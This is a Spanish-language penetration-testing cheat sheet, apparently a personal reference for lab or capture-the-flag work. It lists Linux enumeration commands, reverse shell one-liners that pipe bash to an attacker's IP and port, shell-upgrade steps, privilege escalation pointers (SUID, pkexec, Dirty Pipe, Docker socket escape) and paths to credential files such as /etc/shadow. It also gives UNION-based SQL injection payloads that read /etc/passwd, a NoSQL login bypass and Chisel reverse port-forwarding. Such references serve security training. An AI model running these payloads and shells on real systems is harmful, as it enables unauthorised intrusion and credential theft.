# General-CheatSheet
[PayloadAllTheThinks](https://github.com/swisskyrepo/PayloadsAllTheThings) Lista de payloads y bypasses para Web Application Security.

## Linux Commands

### FIND
* Listar los permisos SUID, debe estar en la carpeta raiz del SO: ``` find  \-perm -4000 2>/dev/null ```

### Sistema Operativo
* Conocer la IP de la máquina ``` hostname -I ```
* Permite ver los puertos abiertos de la máquina ``` netstat -nat ```
* Permite ver los procesos corriendo en la máquina ``` ps -faux ```
* Permite ver los archivos que tienen procesos abiertos ``` lsof -i:<PORT> ```
* Permite ver la descripción del sistema operativo ``` lsb_release -a ```
* Permite ver la versión del kernel ``` uname -a ```
* Permite ajustar el número de filas y columnas de la tty ``` stty rows <ROW_NUMBER> columns <COLUMN_NUMBER> ```
* Permite convertir hexadecimal a texto ```echo "<HEX>" | xargs | xxd -ps -r ```
* En el caso de no tener una bash interactiva se puede realizar el siguiente proceso 
``` script /dev/null -c bash``` o ``` python3 -c 'import pty;pty.spawn("/bin/bash")' ``` luego se debe hacer un **CTRL_Z**
ingresamos ``` stty raw -echo; fg ``` y por último ingresas ``` reset xterm ``` y consigues una shell interactiva en la máquina.
* Buscar las capabilities ``` getcap -r / 2>/dev/null ```

### Python
* Crear un servidor de python en mi máquina local ``` python3 -m http.server <PORT> ```

### Reverse Shell
Se debe ejecutar en la máquina local primero alguna herramienta para poner en escucha el <PORT>,
como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```

Y luego usar alguno de los siguientes comandos

* ``` nc -e /bin/bash <MY_IP> <PORT> ```
* ``` bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1 ```
* ``` bash -c "bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1" ```


## Privilege Escalation

### Docker Escape
* [Docker Socket Escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounted-docker-socket-escape)

### Pkexec
Se comprueba si existe pkexec instalado y si tiene permisos SUID
> which pkexec | xargs ls -l

### Dirty Pipe
Se debe tener GCC instalado en la máquina a atacar
* [Dirty Pipe](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)



## Information Disclose
Archivos PHP con posible información sensible

### Linux
Usuarios y passwords
```
/etc/passwd
/etc/shadow
```
Puertos abiertos
```
/proc/net/tcp
```
Conocer segmento de red de la máquina
```
/proc/net/fib_trie
```

### PHP
```
/cgi-bin/phpinfo.php
/info.php
```


## SQL Injection

### List of Databases, Tables and Columns
Lista información de las bases de datos
> ' union select schema_name from information_schema.schemata-- -

Lista información de las tablas
> ' union select table_name from information_schema.tables where table_schema="<TABLE_NAME>"-- -

Lista información de las columnas
> ' union select column_name from information_schema.columns where table_schema=”<DB_NAME>” and table_name = '<TABLE_NAME>'-- -

### Cargar archivos
> ' union select 1,2,load_file("/etc/passwd")


## NoSQL Injection
> admin'||''==='


## Tools

### Kubernetes
#### Kubeletctl
* ``` kubeletctl exec -s <SERVER_IP>  -p <POD_NAME> -c <CONTAINER_NAME> -i "bash" ```

### Chisel
Chisel se usa para realizar acciones como **LOCAL o REMOTE PORT-FORWARD**

Dejar abierta una conexión como Server
```
./chisel server --reverse -p <PORT>
```
Abrir una conexión como Client al Server, para este caso asiendo **Remote Port-Forward**
```
./chisel client <CHISEL_SERVER_IP>:<CHISEL_SERVER_PORT> R:<LOCAL_PORT>:<LOCAL_IP>:<LOCAL_PORT>
```

### SNMP
#### Onesixtyone
Onesixtyone permite hacer fuerza bruta para conocer las community en un servicio snmp
```
onesixtyone <REMOTE_IP> -c <DICTIONARY_PATH>
```
### Snmpwalk
```
snmpwalk -c <COMMUNITY> -v<SNMP_VERSION> <REMOTE_IP> <SEARCH_PATH>
```
Ejemplo, consideremos que el caracter **|** indica que podemos utilizar una de esas
```
snmpwalk -c public|private|etc -v1|2c|3 1.1.1.1 1|2
```